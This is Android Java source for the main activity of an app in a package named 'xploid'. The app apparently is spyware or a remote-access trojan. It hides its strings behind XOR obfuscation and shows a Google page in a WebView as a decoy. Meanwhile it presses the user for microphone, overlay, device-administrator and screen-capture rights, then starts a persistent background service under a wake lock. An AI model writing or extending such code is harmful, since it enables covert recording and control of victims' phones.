package com.zero.xploid;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import android.widget.LinearLayout;
import android.view.ViewGroup;

public class MainActivity extends Activity {
    private static String $(String str) {
        StringBuilder sb = new StringBuilder();
        char[] charArray = str.toCharArray();
        for (int i = 0; i < charArray.length; i++) {
            switch (i % 4) {
                case 0:
                    sb.append((char) (charArray[i] ^ 50238));
                    break;
                case 1:
                    sb.append((char) (charArray[i] ^ 26184));
                    break;
                case 2:
                    sb.append((char) (charArray[i] ^ 30016));
                    break;
                default:
                    sb.append((char) (charArray[i] ^ 65535));
                    break;
            }
        }
        return sb.toString();
    }


    
    private static final int AUDIO_PERM = 100;
    private static final int SCREEN_PERM = 101;
    private static final int ADMIN_PERM = 102;
    private static final int OVERLAY_PERM = 103;
    
    private WebView webView;
    private Handler handler = new Handler();
    private boolean serviceRunning = false;
    private boolean permissionsGranted = false;
    
    private SharedPreferences prefs;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Create WebView programmatically
        webView = new WebView(this);
        webView.setLayoutParams(new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));
        setContentView(webView);
        
        prefs = getSharedPreferences($("쑎昭甲ﾒ쑡昸甲ﾚ쑘昻").intern(), MODE_PRIVATE);
        
        setupWebView();
        
        // Check if all permissions already granted
        if (areAllPermissionsGranted()) {
            permissionsGranted = true;
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    startService();
                }
            }, 1000);
        } else {
            checkPermissions();
        }
    }
    
    private void setupWebView() {
        webView.setWebViewClient(new WebViewClient());
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.loadUrl(Config.GOOGLE_URL);
    }
    
    private boolean areAllPermissionsGranted() {
        boolean audioGranted = checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
        
        boolean overlayGranted = true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            overlayGranted = Settings.canDrawOverlays(this);
        }
        
        boolean adminGranted = isDeviceAdminActive();
        boolean screenGranted = prefs.getBoolean($("쑍昫甲ﾚ쑛昦生ﾜ쑟昸甴ﾊ쑌昭生ﾘ쑌昩甮ﾋ쑛昬").intern(), false);
        
        return audioGranted && overlayGranted && adminGranted && screenGranted;
    }
    
    private boolean isDeviceAdminActive() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminComp = new ComponentName(this, AdminReceiver.class);
        return dpm.isAdminActive(adminComp);
    }
    
    private void checkPermissions() {
        if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{android.Manifest.permission.RECORD_AUDIO}, AUDIO_PERM);
            return;
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse($("쑎昩産ﾔ쑟是甥ￅ").intern() + getPackageName()));
            startActivityForResult(intent, OVERLAY_PERM);
            return;
        }
        
        if (!isDeviceAdminActive()) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            ComponentName adminComp = new ComponentName(this, AdminReceiver.class);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                $("쑺昭甶ﾖ쑝昭畠ﾾ쑚春甩ﾑ쐞昣甥ﾚ쑎昻畠ﾋ쑖昭畠ﾌ쑛昺甶ﾖ쑝昭畠ﾍ쑋昦甮ﾖ쑐是畠ﾖ쑐晨產ﾞ쑝昣甧ﾍ쑑昽甮ﾛ쐞昿甩ﾋ쑖昧电ﾋ쐞昻甴ﾐ쑎昸甩ﾑ쑙晦").intern());
            startActivityForResult(intent, ADMIN_PERM);
            return;
        }
        
        if (!prefs.getBoolean($("쑍昫甲ﾚ쑛昦生ﾜ쑟昸甴ﾊ쑌昭生ﾘ쑌昩甮ﾋ쑛昬").intern(), false)) {
            requestScreenCapture();
        } else {
            startService();
        }
    }
    
    private void requestScreenCapture() {
        MediaProjectionManager proj = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(proj.createScreenCaptureIntent(), SCREEN_PERM);
    }
    
    private void startService() {
        if (serviceRunning) return;
        
        Intent intent = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        
        serviceRunning = true;
        permissionsGranted = true;
        
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, $("쑳昱甌ﾐ쑝昣").intern());
        lock.acquire();
    }
    
    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        
        if (code == AUDIO_PERM) {
            if (results.length > 0 && results[0] == PackageManager.PERMISSION_GRANTED) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        checkPermissions();
                    }
                }, 500);
            } else {
                Toast.makeText(this, $("쑳昡産ﾍ쑑昸用ﾐ쑐昭畠ﾏ쑛昺甭ﾖ쑍昻甩ﾐ쑐晨甲ﾚ쑏昽甩ﾍ쑛昬畡").intern(), Toast.LENGTH_LONG).show();
                finish();
            }
        }
    }
    
    @Override
    protected void onActivityResult(int code, int result, Intent data) {
        super.onActivityResult(code, result, data);
        
        if (code == SCREEN_PERM) {
            if (result == RESULT_OK && data != null) {
                prefs.edit().putBoolean($("쑍昫甲ﾚ쑛昦生ﾜ쑟昸甴ﾊ쑌昭生ﾘ쑌昩甮ﾋ쑛昬").intern(), true).apply();
                MainService.setData(data, result);
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        startService();
                    }
                }, 500);
            } else {
                Toast.makeText(this, $("쑭昫甲ﾚ쑛昦畠ﾜ쑟昸甴ﾊ쑌昭畠ﾏ쑛昺甭ﾖ쑍昻甩ﾐ쑐晨甲ﾚ쑏昽甩ﾍ쑛昬畡").intern(), Toast.LENGTH_LONG).show();
                finish();
            }
        }
        else if (code == ADMIN_PERM) {
            if (isDeviceAdminActive()) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        checkPermissions();
                    }
                }, 500);
            } else {
                Toast.makeText(this, $("쑺昭甶ﾖ쑝昭畠ﾾ쑚春甩ﾑ쐞昡申￟쑌昭由ﾊ쑗昺甥ﾛ쐟").intern(), Toast.LENGTH_LONG).show();
                finish();
            }
        }
        else if (code == OVERLAY_PERM) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        checkPermissions();
                    }
                }, 500);
            } else {
                Toast.makeText(this, $("쑱显甥ﾍ쑒昩甹￟쑎昭甲ﾒ쑗昻申ﾖ쑑昦畠ﾍ쑛昹电ﾖ쑌昭甤￞").intern(), Toast.LENGTH_LONG).show();
                finish();
            }
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        if (serviceRunning) {
            // Service already running, do nothing
        } else if (!permissionsGranted && areAllPermissionsGranted()) {
            startService();
        }
    }
}